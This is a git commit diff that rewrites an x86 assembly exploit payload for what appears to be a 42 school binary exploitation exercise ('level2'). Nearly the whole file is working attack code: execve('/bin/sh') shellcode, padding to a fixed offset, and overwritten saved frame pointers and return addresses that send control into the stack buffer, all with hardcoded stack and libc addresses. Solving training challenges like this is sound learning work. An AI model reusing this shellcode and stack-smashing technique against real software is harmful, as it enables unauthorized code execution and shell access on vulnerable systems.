0ac4af906e9911bfa964262811e88469f4bd7ed6
Benjamin Brassart <bbrassar@student.42.fr>
2026-04-22 17:08:36 +0200

    Improve assembly payload

--- level2/payload.s
+++ level2/payload.s
@@ -1,38 +1,40 @@
         .intel_syntax noprefix
 
-        .set binsh,      0xb7f8cc58
+        .set binsh,      0xb7f8cc58 # "/bin/sh" in libc
         .set NULL,       0x00000000
         .set SYS_execve, 0xb
-        .set frame_addr, 0xbffffe04
-        .set saved_eip,  0xbffffe58
-        .set saved_ebp,  0x804854a
+        .set buffer,     0xbffffdfc # start of stack buffer in program
+        .set saved_ebp,  0xbffffe58
+        .set saved_eip,  0x0804854a
 
         .section .rodata
 
 payload_start:
-        .asciz "/bin/sh"
-
-        .int 0xbffffdfc
-        .int 0x00000000
-
-        mov eax, 0xb
-        mov ebx, 0xbffffdfc
-        mov ecx, 0xbffffe04
-        mov edx, 0x00000000
-
+        # execve("/bin/sh", {"/bin/sh", NULL}, NULL)
+        mov eax, SYS_execve
+        mov ebx, binsh
+        mov ecx, buffer + (payload_end - payload_start)
+        mov edx, NULL
         int 0x80
 
+payload_end:
+        .int binsh
+        .int NULL
+
 shellcode_end:
+        # padding
         .rept 76 - (shellcode_end - payload_start)
         .byte 0xff
         .endr
 
-        .int saved_eip
-        .int saved_ebp
+        # don't modify p's stack frame...
+        .int saved_ebp          # p's stack frame ebp
+        .int saved_eip          # p's stack frame eip
 
         .rept 8
         .byte 0x41
         .endr
 
-        .int 0xbffffdfc - 40
-        .int 0xbffffdfc + 16
+        # ... modify main's stack frame instead
+        .int NULL               # main's stack frame ebp
+        .int buffer             # main's stack frame eip
